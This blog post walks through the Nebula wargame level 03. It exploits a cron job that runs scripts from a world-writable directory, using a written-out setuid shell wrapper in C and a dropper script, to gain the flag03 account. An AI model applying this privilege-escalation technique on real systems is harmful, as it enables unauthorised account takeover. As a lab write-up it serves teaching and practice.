---
author: alvaro
comments: true
layout: post
title: 'Nebula Level 03'
categories:
- Archive
tags:
- security
---

In the challenge 3 there is a crontab called every couple of minutes for user `flag03`. The directory is as follows. 


```bash
level03@nebula:/home/flag03$ ls -l
total 9
drwxrwxrwx 1 flag03 flag03   40 Dec 14 07:42 writable.d
-rwxr-xr-x 1 flag03 flag03   98 Nov 20  2011 writable.sh
```

Is logical to think that the script that is executed each two minutes by crontab should be writable.sh.

```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Basically the aim of this script is to execute all files in the writable.d directory. This directory has special permission since everyone can write or read in it as `/tmp`. We should achieve that the script `writable.sh` executes some binary and inherit its ownership. In that way if we can execute `/bin/sh` with the flag03 user we will be able to run `getflag` in a flag account.

All what we must do is write the following program in `/tmp` since anyone is able to write in it.

```C
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv)
{
	uid_t euid = geteuid(); 
	gid_t egid = getegid(); 
	setresgid(egid, egid, egid);
	setresuid(euid, euid, euid);

	system("/bin/sh");
}
```

```bash
level03@nebula:/tmp$ make pwned
cc     pwned.c   -o pwned
level03@nebula:/tmp$ cat execme
cp /tmp/pwned /home/flag03/pwned
chown flag03 /home/flag03/pwned
chmod u+s /home/flag03/pwned
level03@nebula:/tmp$ chmod +x execme
level03@nebula:/tmp$ cp execme /home/flag03/writable.d/
```

Copying the file execme in `/home/flag03/writable.d`, it will be execute each two minutes by the user `flag03`. Thanks to that,  the binary `pwned` in the `/home/flag03` will be set uid by the user `flag03` and when the user `level03` executes the binary it will run as `flag03`.

```bash
level03@nebula:/home/flag03$ ls -l
total 9
-rwsrwxr-x 1 flag03 flag03 7321 Dec 14 07:42 pwned
drwxrwxrwx 1 flag03 flag03   40 Dec 14 07:42 writable.d
-rwxr-xr-x 1 flag03 flag03   98 Nov 20  2011 writable.sh
level03@nebula:/home/flag03$ ./pwned
sh-4.2$ id
uid=996(flag03) gid=1004(level03) groups=996(flag03),1004(level03)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

> If you try run `writable.sh` by your own you execute everything with `level03` ownership. I had a problem due to crontab is wasn’t call so I had to configure it to work. All what you should do is the following in the terminal write `crontab -e` and configure the script to run as: `* * * * * flag03 /home/flag03/writable.sh`. With this the script will be run each minute by the user `flag03`


{% include twitter_plug.html %}

	